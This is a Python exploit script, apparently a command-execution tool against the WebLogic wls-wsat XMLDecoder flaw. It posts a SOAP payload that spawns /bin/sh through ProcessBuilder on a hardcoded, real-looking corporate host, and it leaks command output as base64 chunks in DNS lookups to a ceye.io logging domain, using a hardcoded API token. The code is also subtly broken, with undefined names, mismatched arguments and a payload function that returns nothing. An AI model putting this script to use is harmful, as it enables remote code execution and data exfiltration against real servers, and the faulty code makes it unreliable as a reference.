#!/usr/bin/env python3
#encoding=utf-8
#codeby ydhcui

import uuid
import re
import json
import sys
import time
import base64
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class DnsRecv(object):
    def __init__(self,host='0ohaon.ceye.io',token='561b4973b438b7ba84fb3fe8e86bcf72',api=None,iswin=None):
        self.api = api or "http://api.ceye.io/v1/records?token={token}&type={htype}&filter={filter}"
        self.host = host
        self.token = token
        self.iswin = iswin

    def recv(self,uid,htype='dns'):
        res = requests.get(self.api.format(token=self.token,htype=htype,filter=uid))
        data = json.loads(res.text)['data']
        if data:data.reverse()
        ret=[]
        for d in data:
            name = '.'.join(d['name'].split('.')[:-4])
            if name not in ret:
                ret.append(name)
        return ''.join(ret)

    def getuid(self):
        self.uid = str(uuid.uuid4().hex)[:8]
        self.dns = "%s.%s"%(uid,self.host)
        return self.uid

    def getos(self):
        return "ping -n 1 %os%.%s||ping -c 1 `uname`.%s"%(self.dns,self.dns)

    def payload(self,cmd):
        linux = "for l in `%s|base64 -w 50|sed 's/=/_/g'`; do dig $l.%s; done;"%(cmd,self.dns)
        win = 'whoami > 1.txt&&certutil -f -encode 1.txt 2.txt&&type 2.txt|findstr /V [--] > 1.txt||for /f "delims=" %l in (1.txt) do ping -c 1 %l.ccc.0ohaon.ceye.io'


def main(cmd,dns):
    uid,dns = DN.create()
    url = "https://pm.hn.csg.cn/wls-wsat/CoordinatorPortType"
    header = {'content-type': 'text/xml;charset=UTF-8'}
    data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0">
                      <string>/bin/sh</string>
                    </void>
                    <void index="1">
                      <string>-c</string>
                    </void>
                    <void index="2">
                      <string>%s</string>
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""%command_filtered
    res = requests.post(url, payload(cmd,dns),headers = header,verify=False).text
    if 'java.lang.ProcessBuilder' in res:
        return uid#DN.recv(uid)


if __name__=='__main__':
    DN = DnsRecv()
    uid = None
    while True:
        cmd = input('cmd>')
        if cmd.startswith(('get')):
            if uid and len(cmd.strip().split())<2:
                uid = uid
            else:
                uid = cmd.strip().split()[-1]
            try:
                a = DN.recv(uid).replace('_','=')
                #print(a)
                print(base64.b64decode(a).decode())
            except Exception as e:
                print('Error %s'%e)
        else:
            uid = main(DN,cmd)
            print(uid)